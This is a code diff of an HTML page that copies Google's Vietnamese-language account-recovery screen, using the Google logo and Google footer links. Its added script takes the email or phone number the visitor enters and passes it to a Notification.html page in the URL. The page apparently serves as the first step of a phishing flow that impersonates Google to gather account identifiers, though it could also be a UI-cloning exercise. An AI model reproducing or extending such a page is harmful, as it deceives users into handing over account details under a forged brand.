@@ -1,27 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="styles.css" />
-    <title>Input Gmail</title>
-  </head>
-  <body>
-    <div id="wrapper">
-      <form action="">
-        <img id="logo" src="Logo/Google_2015_logo.svg.webp" />
-        <h3>Khôi phục tài khoản</h3>
-        <h4>Khôi phục tài khoản google của bạn</h4>
-        <div class="form-group">
-          <input type="text" name="email" required />
-          <label for="">Email hoặc số điện thoại</label>
-        </div>
-        <div class="button-container">
-          <p class="try-another">Bạn quên địa chỉ email</p>
-          <button class="next"><a href="Notification.html">Tiếp theo</a></button>
-        </div>
-      </form>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="styles.css" />
+  <title>Input Gmail</title>
+</head>
+
+<body>
+  <div id="wrapper">
+    <form>
+      <img id="logo" src="Logo/Google_2015_logo.svg.webp" />
+      <h3>Khôi phục tài khoản</h3>
+      <h4>Khôi phục tài khoản google của bạn</h4>
+      <div class="form-group">
+        <input type="text" name="email" required />
+        <label for="">Email hoặc số điện thoại</label>
+      </div>
+      <div class="button-container">
+        <p class="try-another">Bạn quên địa chỉ email</p>
+        <button class="next">Tiếp theo</button>
+      </div>
+    </form>
+    <div class="footer-text">
+      <p>Tiếng việt</p>
+      <div>
+        <span>Trợ giúp</span>
+        <span>Quyền riêng tư</span>
+        <span>Điều khoản</span>
+      </div>
     </div>
-  </body>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.querySelector('#wrapper form');
+
+      if (form) {
+        const input = form.querySelector('input[name="email"]');
+        form.addEventListener('submit', function (event) {
+          event.preventDefault();
+          const email = input.value;
+          if (email.trim() !== '') {
+            const notificationPageURL = window.location.origin + '/Notification.html?email=' + encodeURIComponent(email);
+            window.location.href = notificationPageURL;
+          } else {
+            alert('Vui lòng nhập địa chỉ email hoặc số điện thoại.');
+          }
+        });
+      } else {
+        console.error('Không tìm thấy phần tử #wrapper form trong tài liệu DOM.');
+      }
+    });
+  </script>
+
+</body>
+
 </html>
